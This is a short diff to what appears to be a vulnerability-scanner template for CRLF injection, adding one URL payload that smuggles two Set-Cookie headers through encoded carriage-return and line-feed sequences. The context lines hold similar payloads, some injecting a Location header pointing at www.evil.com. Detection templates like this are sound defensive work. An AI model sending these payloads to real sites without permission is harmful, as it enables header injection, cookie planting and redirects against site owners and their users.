@@ -34,6 +34,7 @@ http:
       - "{{BaseURL}}/%5Cr%5Cn%20Set-Cookie:coffin=hi;"
       - "{{BaseURL}}/%5Cr%5Cn%5CtSet-Cookie:coffin%5Cr%5CtSet-Cookie:coffin=hi;"
       - "{{BaseURL}}/%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:coffin=hi;"
+      - "{{BaseURL}}/%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:coffin=hi%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:coffin=hi;"
       - "{{BaseURL}}/%E5%98%8A%E5%98%8DLocation:www.evil.com"
       - "{{BaseURL}}/%E5%98%8D%E5%98%8ALocation:www.evil.com"
       - "{{BaseURL}}/%E5%98%8D%E5%98%8ASet-Cookie:coffin=hi"
